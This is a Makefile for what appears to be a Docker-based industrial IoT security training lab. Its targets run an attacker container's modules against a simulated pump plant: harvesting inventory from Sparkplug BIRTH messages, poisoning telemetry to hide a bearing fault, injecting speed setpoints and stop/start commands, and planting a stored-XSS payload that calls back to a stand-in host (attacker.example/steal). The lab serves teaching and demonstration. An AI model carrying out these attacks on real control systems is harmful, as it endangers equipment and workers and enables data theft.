# North Plant IIoT lab — convenience targets.
# Everything drives docker compose. `make help` lists what's available.

COMPOSE ?= docker compose
PY      ?= $(COMPOSE) exec -T attacker python

.DEFAULT_GOAL := help

.PHONY: help up down restart logs ps dashboard \
        recon poison command stop-pump start-pump xss demo clean

help: ## Show this help
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) \
	  | awk 'BEGIN{FS=":.*?## "}{printf "  \033[36m%-14s\033[0m %s\n", $$1, $$2}'

up: ## Build and start the whole stack (broker, plc, edge, platform, attacker)
	$(COMPOSE) up -d --build
	@echo "Dashboard: http://localhost:8000"

down: ## Stop and remove everything
	$(COMPOSE) down

restart: ## Recreate edge + platform (resets the seeded fault and clears state)
	$(COMPOSE) up -d --force-recreate edge-node platform

logs: ## Tail all logs
	$(COMPOSE) logs -f

ps: ## Show container status
	$(COMPOSE) ps

dashboard: ## Open the dashboard in a browser (macOS/Linux)
	@(command -v open >/dev/null && open http://localhost:8000) || \
	 (command -v xdg-open >/dev/null && xdg-open http://localhost:8000) || \
	 echo "Open http://localhost:8000"

recon: ## Harvest the plant inventory from BIRTH certificates
	$(PY) -m attacker.recon

poison: ## Mask Pump-101's bearing fault (Ctrl-C to stop)
	$(PY) -m attacker.poison --pump 101 --de 2.1 --interval 0.5

command: ## Inject a speed setpoint: make command PUMP=102 SPEED=20
	$(PY) -m attacker.command --pump $(or $(PUMP),101) --speed $(or $(SPEED),20)

stop-pump: ## Stop a drive: make stop-pump PUMP=101
	$(PY) -m attacker.command --pump $(or $(PUMP),101) --stop

start-pump: ## Start a drive: make start-pump PUMP=101
	$(PY) -m attacker.command --pump $(or $(PUMP),101) --start

xss: ## Drop a stored-XSS payload via a forged BIRTH
	$(PY) -m attacker.spoof_birth_xss --callback http://attacker.example/steal

demo: ## Run the full narrated walkthrough (for recording)
	./demo.sh

clean: ## Tear down and remove build artifacts
	$(COMPOSE) down -v
	find . -name '__pycache__' -type d -prune -exec rm -rf {} + 2>/dev/null || true
	rm -f common/sparkplug_b_pb2.py
